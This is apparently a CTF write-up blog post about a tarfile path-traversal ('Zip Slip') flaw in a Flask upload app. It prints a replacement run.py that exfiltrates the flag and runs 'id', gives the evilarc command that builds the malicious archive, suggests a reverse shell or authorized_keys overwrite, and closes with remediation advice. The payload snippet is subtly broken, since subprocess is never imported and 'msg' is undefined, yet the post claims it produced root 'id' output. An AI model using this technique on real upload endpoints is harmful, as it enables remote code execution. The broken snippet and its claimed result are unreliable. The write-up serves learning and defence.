.. title: Zip Slip (malicious archives)
.. slug: zip-slip-malicious-archives
.. date: 2021-12-04 17:41:43 UTC-05:00
.. tags: hacking, flask, zipslip, ctf, python, evilarc
.. category: hacking, ctf writeup
.. link:
.. description:
.. type: text

Recently, I completed a CTF challenge that involved an interesting vulnerability.
Since the challenge is active, I won't be providing screenshots, but I've kept things general enough that it shouldn't spoil anything.

The web app
===========

The entire app was provided with a dockerfile, so it could be run offline.

My first step was to investigate the app and see what vulnerabilities might exist.
The web app is very simple, and was developed using Flask.
It contains a single web page that allows you to upload a tar.gz file.
The uploaded file is extracted using the `tarfile <https://docs.python.org/3/library/tarfile.html>`_ library.
The validation of user uploaded file is insufficient.

First, the file is checked to see if it is indeed a tarfile, with a call to ``tarfile.is_tarfile()``.
If this is true, then `tarfile.extract_all()` is called. There is a warning about this function in the docs.

Warning

``Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".``

The vulnerability
=================
Some further research reveals that this is quite an old vulnerability.
The tar program was discovered to be vulnerable all the way back in 2001, `CVE-2001-1267 <https://nvd.nist.gov/vuln/detail/CVE-2001-1267>`_
The core issue is that tar did not validate filenames, so if the archive contained a file named ``../../../../etc/passwd``, when extracted it would overwrite ``/etc/passwd`` by traversing the ``../`` directives as long the user invoking tar had the appropriate permissions)


The python tarfile module apparently shares a great deal of similar code, because the same issue was identified in the python module in 2007 (6 years after the original tar vulnerability).
This was discussed on the python-dev email list https://mail.python.org/pipermail/python-dev/2007-August/074290.html
It was again discussed in 2014, https://bugs.python.org/issue21109
Now, 20 years later, there still isn't a resolution.

In the general sense, I see two potential ways of exploiting a vulnerability like this.
In modern linux environments, /etc/passwd no longer contains sensitive information like password hashes, so overwriting that file won't allow access to the machine.
One potential attack would be to overwrite the users ``~/.ssh/authorized_keys`` file to include your own key.
Of course, for that to be exploitable, you would already need access to the file system.

Since python is now popular for developing web apps through Django and Flask, this opens up a new avenue: uploading a malicious archive to overwrite or create files.

Back to the challenge, since the app is flask, it is possible to overwrite the main app handler.

The original file is quite simple

.. code:: python
  :number-lines:


  from application.main import app
  app.run(host='0.0.0.0', port=1337, debug=True, use_evalex=False)



and the modified code:

.. code:: python
  :number-lines:

  from application.main import app
  import shutil
  import os
  try:
      path = '/app/application/static/'
      shutil.copy('flag', os.path.join(path, 'flag'))

      out = subprocess.check_output('id')

      with open(os.path.join(path, 'logfile.txt'), 'w') as f:
          f.write(msg)
  except:
      pass

  app.run(host='0.0.0.0', port=1337, debug=True, use_evalex=False)

This simply copies the flag from it's location within the app folder to the static files that are served by flask.
This could be modified to do the same thing for multiple files, or initiate a reverse shell.

The exploit
===========

I found a tool that had already been created to craft the malicious archive.

https://github.com/ptoomey3/evilarc

That script uses the same vulnerable library to craft the archive.
This also appears to work on zip archives as well, but that's something for another time.

Simply running the script ``python evilarc.py run.py -f evil.tar.gz -o unix -p /app`` generates the archive.

* ``evil.tar.gz`` is the file that is created
* ``run.py`` is the modified file from earlier
* ``-p /app`` specifies the directory where ``run.py`` will be overwritten after traversal

Uploading the resulting file in a browser and then doing ``curl http://localhost:1337/static/flag`` outputs the flag.

Further, ``curl http://localhost:1337/static/logfile.txt`` reveals this app is running as root
``'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)``

Impact
======

This is a pretty severe vulnerability as it allows full remote code execution.
In this particular instance, the flask app is run as root, and directly runs the app.py file in debug mode.

Remediation
===========

The most severe problem with this app is that the contents of the uploaded file are trusted implicitly.
To fix this, the user-supplied archive should not be blindly extracted.
There currently isn't a fixed version of the ``tarfile`` module, so until that is fixed upstream, some crude checks might provide some protection.
Ex: refusing to extract files that start with ``..``
The flask app shouldn't be run with debug mode turned on in a production environment.
The flask app also shouldn't be running as root.

I'm not sure how applicable this is to real world websites, as this example relies on ``supervisord`` detecting the overwritten ``/app/run.py`` file and reloading.
Having never deployed a flask app to production myself, my understanding is that something like gnuicorn would only do that if debug settings were explicitly enabled.
https://docs.gunicorn.org/en/stable/settings.html#debugging


Closing
=======

This was a really fun challenge (and writing this took much longer than getting the flag).
It is really interesting that this bug still exists 20 years after first identified in tar.
The spread of python based web apps due to the popularity of Django and flask has brought old vulnerabilities that previously required local file system access can now be leveraged to remotely execute code.
